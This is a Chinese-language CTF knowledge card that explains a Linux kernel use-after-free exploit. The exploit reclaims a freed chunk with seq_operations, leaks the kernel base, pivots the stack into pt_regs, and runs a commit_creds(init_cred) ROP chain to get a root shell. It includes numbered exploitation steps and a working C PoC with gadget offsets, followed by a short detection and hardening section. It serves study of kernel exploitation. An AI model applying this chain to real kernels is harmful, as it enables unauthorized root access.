---
id: binary-pwn-kernel-seqops-uaf-pt-regs-stack-migration
title: 内核 seq_operations UAF + pt_regs 栈迁移：泄露内核基址后 ROP commit_creds(init_cred)
type: scenario
domain: binary
path: binary/pwn/kernel
technique: kernel-seqops-uaf-pt-regs-stack-migration
aliases:
- seq_operations UAF
- seq_ops pt_regs 栈迁移
- open /proc/self/stat 泄露内核基址
- add rsp 0x180 gadget
- commit_creds init_cred ROP
- swapgs_restore_regs_and_return_to_usermode
- 内核 UAF 提权
tags:
- binary
- pwn
- kernel
- uaf
- seq-operations
- pt-regs
- stack-migration
- rop
- commit-creds
- kpti
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V175
  verified_at: '2026-11-06T17:19:13+08:00'
  notes: 已对照原文完整 exp 核对：alloc(0x20)/free/open(/proc/self/stat) 复用 seq_operations、UAF 读 single_start 算偏移、覆盖 start 为 add rsp,0x180、内联汇编布置 pt_regs、commit_creds(init_cred)、swapgs_restore+9 返回用户态；原文无图。未在本机复跑 QEMU/exp。
---

## 一句话结论

内核模块存在 `kmalloc-32` 的 UAF 时，可先释放 0x20 对象，再 `open("/proc/self/stat")` 让 `seq_operations` 复用该槽；通过 UAF 读泄漏 `start` 等函数指针得到内核基址，再 UAF 写把 `start` 改成 `add rsp, 0x180; ret` 栈迁移 gadget；在触发 `read()` 前用内联汇编布置用户寄存器，使 syscall 入口保存的 `pt_regs` 正好成为 ROP 链，最终执行 `commit_creds(init_cred)` 并经 `swapgs_restore_regs_and_return_to_usermode` 返回用户态拿 root。

## 原理

- **seq_operations 的分配与布局**：`open("/proc/self/stat", O_RDONLY)` 走 `single_open`，`kmalloc(sizeof(struct seq_operations), GFP_KERNEL_ACCOUNT)` 分配 32 字节对象（4 个函数指针：`start`、`stop`、`next`、`show`），落在 `kmalloc-32` 缓存。它与题目中 0x20 的堆块同缓存，因此 UAF 块被释放后，打开 seq 文件即可让 `seq_operations` 占用同一内存。
- **泄露内核基址**：`seq_operations->start` 在 `single_open` 中被初始化为 `single_start`，`next`/`stop` 也指向内核代码。UAF 读回 0x20 字节即可拿到这些函数指针；用已知的 `single_start` 偏移（或 `SEQ_OPS_0`）相减得到 KASLR 偏移，进而算出 `commit_creds`、`init_cred`、`swapgs_restore_regs_and_return_to_usermode` 与 gadget 地址。
- **控制流劫持**：UAF 写覆盖 `seq_operations->start` 为栈迁移 gadget（样例 `add rsp, 0x180; ret`）。对同一个 seq fd 调用 `read()` 时，`seq_read` 会执行 `m->op->start(m, &pos)`，控制流进入伪造的 `start`。
- **pt_regs 是 ROP 链的载体**：x86-64 系统调用入口 `entry_SYSCALL_64` 用 `PUSH_AND_CLEAR_REGS` 把用户寄存器按 `pt_regs` 布局压入内核栈（r15、r14、r13、r12、rbp、rbx、r11、r10、r9、r8、rax、rcx、rdx、rsi、rdi、orig_rax、rip、cs、eflags、rsp、ss）。用户在 `syscall` 前设置这些寄存器，就能在进入内核时把任意值写进 pt_regs。
- **为什么 `add rsp, 0x180` 能落到 pt_regs**：`read()` 的调用链在内核栈上压入返回地址/局部变量；从 `start` 被调用的位置向上抬 0x180，正好落到该 syscall 保存的 pt_regs 区域，随后的 `ret` 依次弹出 r15、r14、…，把保存的寄存器值当作 ROP 链执行。
- **ROP 链布局**：样例把 `r15` 设为填充、`r14=pop rdi; ret`、`r13=init_cred`、`r12=commit_creds`、`rbp=swapgs_restore_regs_and_return_to_usermode`；`ret` 后先执行 `pop rdi; ret` 把 `init_cred` 放入 rdi，再 `commit_creds(init_cred)` 把当前进程 cred 换成 root 的静态 cred。
- **KPTI 返回**：`swapgs_restore_regs_and_return_to_usermode` 负责切换 CR3、`swapgs`、`iretq`。样例在其地址上加 9 跳过前导栈操作，直接使用后续的 `swapgs; iretq`；栈上按 `user_shell_addr, user_cs, user_rflags, user_sp, user_ss` 布局即可返回用户态执行 `system("/bin/sh")`。
- **为什么用 `init_cred` 而不是 `prepare_kernel_cred`**：`init_cred` 是 init 进程的静态 cred，权限为 root，地址可由内核基址加固定偏移得到；`commit_creds(&init_cred)` 一步完成提权，不需要额外调用 `prepare_kernel_cred(NULL)`，在 ROP 空间有限时更简洁。
- **KASLR 处理**：样例本地关闭 KASLR，直接用固定偏移；开启 KASLR 时用泄漏的 `single_start` 指针计算偏移，再加到所有符号/gadget 上。

## 触发条件

- 内核模块存在 `kmalloc-32` 的 UAF（free 后仍可 read/write 同一 index），且能控制 0x20 字节内容。
- 目标内核启用 `seq_operations`（`/proc/self/stat` 等 seq 文件可打开），且 UAF 块与 `seq_operations` 落在同一 kmalloc 缓存。
- 能通过 UAF 读泄漏至少一个内核函数指针（KASLR 开启时必需）。
- 内核开启 KPTI（需要 `swapgs_restore_regs_and_return_to_usermode` 返回路径）；SMEP/SMAP 可开启，因为使用内核 ROP 而非 ret2usr。
- 有可用的栈迁移 gadget（如 `add rsp, 0x180; ret`）和 `pop rdi; ret`、`commit_creds`、`init_cred` 地址。

## 利用步骤

1. 打开设备，`alloc(0x20)` 分配一个 0x20 块，再 `free(0)` 制造 UAF。
2. `open("/proc/self/stat", O_RDONLY)`，让 `single_open` 分配的 `seq_operations` 复用刚释放的块。
3. 用 UAF `read(0, 0x20, buf)` 读回 `seq_operations`，从 `buf[0]`（`start=single_start`）等指针计算内核基址与 KASLR 偏移。
4. 计算 `commit_creds`、`init_cred`、`pop rdi; ret`、`swapgs_restore_regs_and_return_to_usermode` 和栈迁移 gadget 地址。
5. 用 UAF `write(0, 0x20, buf)` 把 `start` 覆盖为栈迁移 gadget。
6. 在用户态用内联汇编设置 r15/r14/r13/r12/rbp 等寄存器，`syscall` 调用 `read(seq_fd, rsp, 8)` 触发 `seq_ops->start`；`add rsp, 0x180` 落到 pt_regs，`ret` 开始执行 ROP。
7. ROP 执行 `commit_creds(init_cred)`，再经 `swapgs_restore_regs_and_return_to_usermode` 返回用户态 `system("/bin/sh")`。

## PoC

```c
#define COMMIT_CREDS 0xffffffff810c8d40
#define SEQ_OPS_0 0xffffffff81319d30
#define INIT_CRED 0xffffffff82663300
#define POP_RDI_RET 0xffffffff81089250
#define SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00f30

size_t buf[0x100];
size_t swapgs_restore_regs_and_return_to_usermode;
size_t init_cred, pop_rdi_ret, commit_creds, gadget;
long dev_fd, seq_fd;
size_t kernel_offset;

void vuln(void) {
    __asm__(
        "mov r15, 0xbeefdead;"
        "mov r14, pop_rdi_ret;"
        "mov r13, init_cred;"
        "mov r12, commit_creds;"
        "mov rbp, swapgs_restore_regs_and_return_to_usermode;"
        "mov rbx, 0xbeefdead;"
        "mov r11, 0xbeefdead;"
        "mov r10, 0xbeefdead;"
        "mov r9, 0xbeefdead;"
        "mov r8, 0xbeefdead;"
        "xor rax, rax;"
        "mov rcx, 0x666666;"
        "mov rdx, 8;"
        "mov rsi, rsp;"
        "mov rdi, seq_fd;"
        "syscall"
    );
}

int main(void) {
    dev_fd = open("/dev/kerpwn", O_RDWR);
    allocChunk(0x20, buf);
    deleteChunk(0);
    seq_fd = open("/proc/self/stat", O_RDONLY);
    readChunk(0, 0x20, buf);                 // 泄漏 seq_operations

    kernel_offset = buf[0] - SEQ_OPS_0;
    swapgs_restore_regs_and_return_to_usermode =
        SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + kernel_offset + 9;
    init_cred = INIT_CRED + kernel_offset;
    pop_rdi_ret = POP_RDI_RET + kernel_offset;
    commit_creds = COMMIT_CREDS + kernel_offset;
    gadget = 0xffffffff8135b0f6 + kernel_offset;  // add rsp, 0x180; ret

    buf[0] = gadget;
    writeChunk(0, 0x20, buf);               // 覆盖 start
    vuln();                                 // 触发 read(seq_fd,...)
    system("/bin/sh");
}
```

## 变体与关联

- 变体：换用其他 seq 文件（`/proc/self/maps` 等）或其他 kmalloc-32 含函数指针对象（`tty_struct`、`msg_msg`）做喷射/占用。
- 变体：若 SMEP 关闭，可改 `start` 为用户态 shellcode 做 ret2usr；若 KPTI 关闭，可直接 `swapgs; iretq`。
- 变体：栈迁移 gadget 不一定是 `add rsp, 0x180`，可用 `pop rsp`、`xchg rsp, rax` 等，按实际栈布局选择。
- 关联卡片：[[binary-pwn-kernel-kqueue-maxentries-intwrap-seqops-ret2usr]]、[[binary-pwn-kernel-ret2dir-physmap-spray-rop-commit-creds]]、[[binary-pwn-kernel-module-ioctl-user-function-pointer-call]]、[[binary-pwn-kernel-qemu-initramfs-gdb-workflow]]。

## 检测与防御

- 检测：内核模块 free 后仍保留指针/索引，允许再次 read/write 同一对象；`seq_operations` 的 `start` 被写成非内核代码地址或异常 gadget。
- 检测：对 seq 文件的 `read()` 触发内核栈异常、CR3/GS 切换异常或 ROP 链特征；`commit_creds` 被调用且参数为 `init_cred`。
- 防御：修复 UAF（free 后置空、引用计数、RCU 延迟释放）；开启 `CONFIG_SLAB_FREELIST_RANDOM`、`init_on_free`、`CONFIG_HARDENED_USERCOPY`。
- 防御：开启 SMEP/SMAP/KPTI/KASLR；启用 `CONFIG_RANDOMIZE_MEMORY` 与内核 CFI；限制 `/proc` seq 文件分配与 `kmalloc-32` 喷射面。
